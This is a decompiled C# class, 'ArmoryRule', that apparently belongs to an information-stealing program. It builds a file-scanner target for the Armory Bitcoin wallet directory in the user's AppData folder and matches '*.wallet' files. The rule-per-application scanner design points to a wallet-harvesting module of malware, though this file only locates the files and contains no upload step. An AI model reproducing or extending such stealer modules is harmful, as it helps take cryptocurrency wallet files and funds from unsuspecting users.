using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000013 RID: 19
public class ArmoryRule : FileScannerRule
{
	// Token: 0x06000050 RID: 80 RVA: 0x00004EF4 File Offset: 0x000030F4
	public ArmoryRule()
	{
		base.Name = "Armory";
	}

	// Token: 0x06000051 RID: 81 RVA: 0x00004F07 File Offset: 0x00003107
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x06000052 RID: 82 RVA: 0x00004F30 File Offset: 0x00003130
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Armory";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*.wallet",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
